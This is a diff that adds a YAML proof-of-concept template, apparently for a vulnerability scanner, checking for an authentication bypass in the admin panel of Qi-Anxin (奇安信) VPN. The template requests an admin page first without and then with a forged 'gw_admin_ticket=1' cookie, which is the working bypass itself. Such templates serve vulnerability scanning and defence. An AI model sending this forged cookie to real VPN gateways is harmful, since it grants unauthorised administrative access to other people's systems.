@@ -1,0 +1,23 @@
+id: poc-yaml-qiannxin-vpn-admin-bypass
+info:
+  name: 奇安信 VPN 管理后台绕过
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 奇安信VPN
+variables:
+  gw_cookie: str("gw_admin_ticket=1")
+requests:
+- method: GET
+  path: /admin/group/x_group.php?id=1
+  expression: 'status_code == 200 && len(body) == 0
+
+    '
+- method: GET
+  path: /admin/group/x_group.php?id=1
+  headers:
+    Cookie: '{{.gw_cookie}}'
+  expression: 'status_code == 200 && contains(body, "group/group_action.php")
+
+    '
+transport: http
